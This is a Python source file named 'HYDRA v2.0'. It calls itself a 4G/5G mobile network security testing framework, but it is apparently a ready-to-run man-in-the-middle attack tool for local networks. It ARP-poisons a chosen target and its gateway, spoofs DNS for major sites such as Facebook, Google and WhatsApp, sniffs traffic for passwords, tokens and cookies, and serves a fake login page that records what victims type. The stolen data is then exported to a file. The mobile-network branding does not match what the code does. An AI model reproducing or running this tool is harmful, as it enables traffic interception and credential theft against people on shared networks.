#!/usr/bin/env python3
"""
HYDRA v2.0 - Mobile Network Security Testing Framework
Professional 4G/5G Network Security Assessment

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import threading
import subprocess
import signal
import base64
import hashlib
import random
import ssl
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict
from urllib.parse import urlparse, urljoin, parse_qs
import requests
import argparse

try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.l2 import ARP, Ether
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.http import HTTP, HTTPRequest
    from scapy.layers.dhcp import DHCP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

VERSION = "2.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.PURPLE}{Colors.BOLD}     ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
    ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
    ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
    ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
    ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
    ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                   
{Colors.GREEN}          MOBILE NETWORK SECURITY TESTING{Colors.WHITE}
{Colors.CYAN}    Professional 4G/5G Security Assessment{Colors.WHITE}
{Colors.YELLOW}    Version {VERSION} | Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== UTILITIES ====================
class Utilities:
    @staticmethod
    def timestamp() -> str:
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def get_default_gateway() -> str:
        try:
            result = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True)
            if result.stdout:
                match = re.search(r'default via ([\d.]+)', result.stdout)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    @staticmethod
    def scan_network(ip_range: str) -> List[Dict]:
        devices = []
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), 
                         timeout=3, verbose=False)
            for sent, received in ans:
                devices.append({'ip': received.psrc, 'mac': received.hwsrc})
        except:
            pass
        return devices

# ==================== ARP SPOOFING ====================
class ARPSpoofEngine:
    def __init__(self, interface: str, target_ip: str, gateway_ip: str):
        self.interface = interface
        self.target = target_ip
        self.gateway = gateway_ip
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets_sent': 0}
        self.target_mac = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            cprint("[!] Could not resolve MAC", Colors.RED)
            sys.exit(1)
        
        self._enable_ip_forward()
    
    def _get_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def _enable_ip_forward(self):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')
    
    def start(self):
        cprint("[ARP] Poisoning {} -> {}".format(self.target, self.gateway), Colors.YELLOW)
        self.running = True
        
        while self.running and not self.stop_event.is_set():
            send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway), verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target), verbose=False)
            self.stats['packets_sent'] += 2
            time.sleep(1)
    
    def stop(self):
        cprint("[ARP] Restoring network...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()
        
        send(ARP(op=2, pdst=self.target, hwdst=self.target_mac, psrc=self.gateway, hwsrc=self.gateway_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=self.target, hwsrc=self.target_mac), count=5, verbose=False)
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        
        cprint("[+] Network restored", Colors.GREEN)

# ==================== DNS SPOOFING ====================
class DNSSpoofEngine:
    def __init__(self, interface: str, redirect_ip: str):
        self.interface = interface
        self.redirect_ip = redirect_ip
        self.running = False
        self.stop_event = threading.Event()
        self.spoof_map = {}
        self.stats = {'responses_sent': 0}
        self._load_default_spoofs()
    
    def _load_default_spoofs(self):
        targets = [
            'facebook.com', 'google.com', 'youtube.com', 'instagram.com',
            'tiktok.com', 'twitter.com', 'whatsapp.com', 'telegram.org'
        ]
        for domain in targets:
            self.spoof_map[domain] = self.redirect_ip
    
    def start(self):
        cprint("[DNS] Starting DNS spoofing...", Colors.YELLOW)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            if pkt.haslayer(DNS) and pkt.haslayer(IP) and pkt.haslayer(UDP):
                if pkt[DNS].qr == 0 and pkt[DNS].qd:
                    qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore').rstrip('.')
                    for domain, redirect_ip in self.spoof_map.items():
                        if domain in qname:
                            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                            udp = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
                            dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                     an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=300, rdata=redirect_ip))
                            send(ip/udp/dns, verbose=False)
                            self.stats['responses_sent'] += 1
                            break
        
        sniff(iface=self.interface, filter="port 53", prn=packet_handler, store=0,
              stop_filter=lambda x: self.stop_event.is_set())
    
    def stop(self):
        cprint("[DNS] Stopping...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()

# ==================== TRAFFIC ANALYZER ====================
class TrafficAnalyzer:
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.stop_event = threading.Event()
        self.credentials = []
        self.cookies = []
        self.urls = []
        self.devices = {}
        self.stats = {'packets': 0, 'credentials': 0, 'cookies': 0}
        self.lock = threading.Lock()
    
    def start(self):
        cprint("[ANALYZE] Starting traffic analysis...", Colors.BLUE)
        self.running = True
        
        def packet_handler(pkt):
            if not self.running:
                return
            with self.lock:
                self.stats['packets'] += 1
            if pkt.haslayer(HTTPRequest):
                self._analyze_http(pkt)
            if pkt.haslayer(Raw):
                self._extract_credentials(pkt)
            if pkt.haslayer(DHCP):
                self._detect_device(pkt)
        
        sniff(iface=self.interface, prn=packet_handler, store=0,
              stop_filter=lambda x: self.stop_event.is_set())
    
    def _analyze_http(self, pkt):
        try:
            http = pkt[HTTPRequest]
            host = http.Host.decode() if http.Host else 'unknown'
            path = http.Path.decode() if http.Path else '/'
            method = http.Method.decode() if http.Method else 'GET'
            full_url = f"http://{host}{path}"
            
            with self.lock:
                self.urls.append({'timestamp': Utilities.timestamp(), 'url': full_url, 'method': method})
            
            if http.Cookie:
                cookie_str = http.Cookie.decode()
                with self.lock:
                    self.cookies.append({'timestamp': Utilities.timestamp(), 'url': full_url, 'cookie': cookie_str})
                    self.stats['cookies'] += 1
                cprint("[COOKIE] {} -> {}".format(host, cookie_str[:50]), Colors.GREEN)
        except:
            pass
    
    def _extract_credentials(self, pkt):
        try:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            patterns = [
                (r'username[=:]\s*([^\s&]+)', 'username'),
                (r'password[=:]\s*([^\s&]+)', 'password'),
                (r'email[=:]\s*([^\s&]+)', 'email'),
                (r'token[=:]\s*([^\s&]+)', 'token')
            ]
            
            for pattern, cred_type in patterns:
                matches = re.findall(pattern, payload, re.IGNORECASE)
                for match in matches:
                    if len(match) > 2:
                        with self.lock:
                            self.credentials.append({'timestamp': Utilities.timestamp(), 'type': cred_type, 'value': match})
                            self.stats['credentials'] += 1
                        cprint("[CREDENTIAL] {}: {}".format(cred_type, match), Colors.RED)
        except:
            pass
    
    def _detect_device(self, pkt):
        try:
            for opt in pkt[DHCP].options:
                if opt[0] == 'hostname' and opt[1]:
                    hostname = opt[1].decode('utf-8', errors='ignore')
                    mac = pkt[Ether].src if pkt.haslayer(Ether) else 'unknown'
                    ip = pkt[IP].src if pkt.haslayer(IP) else 'unknown'
                    if ip not in self.devices:
                        self.devices[ip] = {'ip': ip, 'mac': mac, 'hostname': hostname}
                        cprint("[DEVICE] {} - {}".format(ip, hostname), Colors.CYAN)
                    break
        except:
            pass
    
    def get_stats(self) -> Dict:
        with self.lock:
            return {
                'packets': self.stats['packets'],
                'credentials': self.stats['credentials'],
                'cookies': self.stats['cookies'],
                'urls': len(self.urls),
                'devices': len(self.devices)
            }
    
    def get_credentials(self) -> List:
        with self.lock:
            return self.credentials.copy()
    
    def get_cookies(self) -> List:
        with self.lock:
            return self.cookies.copy()
    
    def get_urls(self) -> List:
        with self.lock:
            return self.urls.copy()
    
    def get_devices(self) -> Dict:
        with self.lock:
            return self.devices.copy()
    
    def stop(self):
        cprint("[ANALYZE] Stopping...", Colors.YELLOW)
        self.running = False
        self.stop_event.set()

# ==================== PHISHING SERVER ====================
class PhishingServer:
    def __init__(self, port: int = 80):
        self.port = port
        self.captured = []
        self.running = False
        self.server = None
    
    def start(self):
        cprint("[PHISHING] Starting on port {}".format(self.port), Colors.YELLOW)
        import http.server
        
        class PhishingHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self._handle()
            
            def do_POST(self):
                self._handle()
            
            def _handle(self):
                content = """
                <html>
                <head><title>Login Required</title>
                <style>
                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
                    .box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
                    input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
                    button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
                </style>
                </head>
                <body>
                <div class="box">
                    <h2>Login Required</h2>
                    <form method="POST" action="/capture">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Login</button>
                    </form>
                </div>
                </body>
                </html>
                """
                
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    if content_length > 0:
                        body = self.rfile.read(content_length).decode()
                        data = parse_qs(body)
                        captured = {
                            'timestamp': Utilities.timestamp(),
                            'ip': self.client_address[0],
                            'username': data.get('username', [''])[0],
                            'password': data.get('password', [''])[0]
                        }
                        self.server.captured.append(captured)
                        cprint("[PHISHING] {}:{}".format(captured['username'], captured['password']), Colors.RED, bold=True)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"<html><body><h1>Success</h1></body></html>")
                else:
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content.encode())
        
        self.server = http.server.HTTPServer(('0.0.0.0', self.port), PhishingHandler)
        self.running = True
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        cprint("[+] Phishing server running", Colors.GREEN)
    
    def stop(self):
        cprint("[PHISHING] Stopping...", Colors.YELLOW)
        self.running = False
        if self.server:
            self.server.shutdown()
    
    def get_captured(self) -> List:
        return self.captured

# ==================== MAIN FRAMEWORK ====================
class Hydra:
    def __init__(self, interface: str):
        self.interface = interface
        self.target_ip = None
        self.gateway_ip = None
        self.arp = None
        self.dns = None
        self.analyzer = None
        self.phishing = None
        self.running = False
        self.components = []
        self.start_time = 0
    
    def discover_network(self):
        cprint("\n[DISCOVER] Scanning network...", Colors.BLUE)
        self.gateway_ip = Utilities.get_default_gateway()
        local_ip = Utilities.get_local_ip()
        
        if not self.gateway_ip:
            cprint("[-] Gateway not found", Colors.RED)
            return False
        
        cprint("[+] Gateway: {}".format(self.gateway_ip), Colors.GREEN)
        cprint("[+] Local IP: {}".format(local_ip), Colors.GREEN)
        
        devices = Utilities.scan_network(".".join(local_ip.split('.')[:3]) + ".0/24")
        cprint("[+] Found {} devices".format(len(devices)), Colors.GREEN)
        for d in devices:
            cprint("    {} - {}".format(d['ip'], d['mac']), Colors.DIM)
        return True
    
    def select_target(self):
        target = input("[>] Target IP: ").strip()
        if not target:
            return False
        self.target_ip = target
        cprint("[+] Target: {}".format(target), Colors.GREEN)
        return True
    
    def start_attack(self):
        if not self.target_ip or not self.gateway_ip:
            cprint("[-] Target or gateway not set", Colors.RED)
            return
        
        cprint("\n[ATTACK] Starting...", Colors.RED, bold=True)
        self.start_time = time.time()
        self.components = []
        
        self.arp = ARPSpoofEngine(self.interface, self.target_ip, self.gateway_ip)
        t1 = threading.Thread(target=self.arp.start, daemon=True)
        t1.start()
        self.components.append(('ARP', self.arp))
        time.sleep(1)
        
        local_ip = Utilities.get_local_ip()
        self.dns = DNSSpoofEngine(self.interface, local_ip)
        t2 = threading.Thread(target=self.dns.start, daemon=True)
        t2.start()
        self.components.append(('DNS', self.dns))
        time.sleep(1)
        
        self.analyzer = TrafficAnalyzer(self.interface)
        t3 = threading.Thread(target=self.analyzer.start, daemon=True)
        t3.start()
        self.components.append(('Analyzer', self.analyzer))
        time.sleep(1)
        
        self.phishing = PhishingServer()
        t4 = threading.Thread(target=self.phishing.start, daemon=True)
        t4.start()
        self.components.append(('Phishing', self.phishing))
        
        self.running = True
        cprint("\n[+] Attack started", Colors.GREEN, bold=True)
    
    def stop_attack(self):
        cprint("\n[STOP] Stopping...", Colors.YELLOW)
        for name, engine in self.components:
            try:
                engine.stop()
                cprint("[+] {} stopped".format(name), Colors.GREEN)
            except:
                pass
        self.running = False
        cprint("[+] Attack stopped", Colors.GREEN)
    
    def show_status(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        stats = self.analyzer.get_stats()
        print("\n" + "="*60)
        cprint(" STATUS", Colors.PURPLE, bold=True)
        print("="*60)
        print(f"Target: {self.target_ip}")
        print(f"Uptime: {int(time.time() - self.start_time)}s")
        print(f"Packets: {stats['packets']}")
        print(f"Credentials: {stats['credentials']}")
        print(f"Cookies: {stats['cookies']}")
        print(f"Devices: {stats['devices']}")
        print("="*60)
    
    def show_credentials(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        creds = self.analyzer.get_credentials()
        if not creds:
            cprint("[!] No credentials", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" CREDENTIALS", Colors.RED, bold=True)
        print("="*60)
        for c in creds:
            print(f"{c['type']}: {c['value']}")
        print("="*60)
    
    def show_cookies(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        cookies = self.analyzer.get_cookies()
        if not cookies:
            cprint("[!] No cookies", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" COOKIES", Colors.YELLOW, bold=True)
        print("="*60)
        for c in cookies[-10:]:
            print(f"{c['url']}: {c['cookie'][:80]}")
        print("="*60)
    
    def show_devices(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        devices = self.analyzer.get_devices()
        if not devices:
            cprint("[!] No devices", Colors.YELLOW)
            return
        
        print("\n" + "="*60)
        cprint(" DEVICES", Colors.CYAN, bold=True)
        print("="*60)
        for ip, info in devices.items():
            print(f"{ip} - {info.get('hostname', 'unknown')}")
        print("="*60)
    
    def export_results(self):
        if not self.analyzer:
            cprint("[!] Not started", Colors.YELLOW)
            return
        
        data = {
            'timestamp': Utilities.timestamp(),
            'target': self.target_ip,
            'gateway': self.gateway_ip,
            'credentials': self.analyzer.get_credentials(),
            'cookies': self.analyzer.get_cookies(),
            'urls': self.analyzer.get_urls(),
            'devices': self.analyzer.get_devices(),
            'phishing': self.phishing.get_captured() if self.phishing else [],
            'stats': self.analyzer.get_stats()
        }
        
        filename = f"hydra_export_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        cprint(f"[+] Exported: {filename}", Colors.GREEN)
    
    def run_menu(self):
        while True:
            print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}HYDRA - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] Discover Network
[2] Select Target
[3] Start Attack
[4] Show Status
[5] Show Devices
[6] Show Credentials
[7] Show Cookies
[8] Export Results
[9] Stop Attack
[10] Exit
""")
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.discover_network()
            elif choice == '2':
                self.select_target()
            elif choice == '3':
                self.start_attack()
            elif choice == '4':
                self.show_status()
            elif choice == '5':
                self.show_devices()
            elif choice == '6':
                self.show_credentials()
            elif choice == '7':
                self.show_cookies()
            elif choice == '8':
                self.export_results()
            elif choice == '9':
                self.stop_attack()
            elif choice == '10':
                if self.running:
                    self.stop_attack()
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="HYDRA v2.0 - Mobile Network Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 hydra.py -i eth0
  sudo python3 hydra.py -i eth0 --target 192.168.1.100
  sudo python3 hydra.py -i eth0 --scan
        """
    )
    
    parser.add_argument("-i", "--interface", default="eth0", help="Network interface")
    parser.add_argument("--target", help="Target IP")
    parser.add_argument("--scan", action="store_true", help="Scan network only")
    
    args = parser.parse_args()
    
    print_banner()
    
    if os.geteuid() != 0:
        cprint("[!] Root required", Colors.RED)
        sys.exit(1)
    
    if not SCAPY_AVAILABLE:
        cprint("[!] Scapy required: pip3 install scapy", Colors.RED)
        sys.exit(1)
    
    hydra = Hydra(args.interface)
    
    if args.scan:
        hydra.discover_network()
        sys.exit(0)
    
    if args.target:
        hydra.target_ip = args.target
        hydra.gateway_ip = Utilities.get_default_gateway()
        cprint(f"[+] Target: {hydra.target_ip}", Colors.GREEN)
        cprint(f"[+] Gateway: {hydra.gateway_ip}", Colors.GREEN)
        hydra.start_attack()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            hydra.stop_attack()
        sys.exit(0)
    
    hydra.run_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
